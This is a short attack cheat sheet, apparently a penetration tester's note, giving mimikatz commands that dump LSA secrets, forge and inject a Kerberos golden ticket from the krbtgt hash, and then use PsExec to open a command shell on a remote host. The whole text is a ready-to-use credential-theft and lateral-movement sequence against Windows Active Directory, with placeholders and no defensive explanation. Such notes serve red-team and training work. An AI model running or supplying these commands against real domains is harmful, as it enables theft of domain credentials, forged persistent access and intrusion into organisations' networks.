# GOLDEN TICKET
#mimikatz 
```
privilege::debug
lsadump::lsa /patch

#can continue on different system

kerberos::purge
kerberos::golden /user:[user] /domain:[domain] /sid:[sid of user forging ticket] /krbtgt:[hash] /ptt

misc::cmd

PsExec.exe \\[host] cmd.exe
```

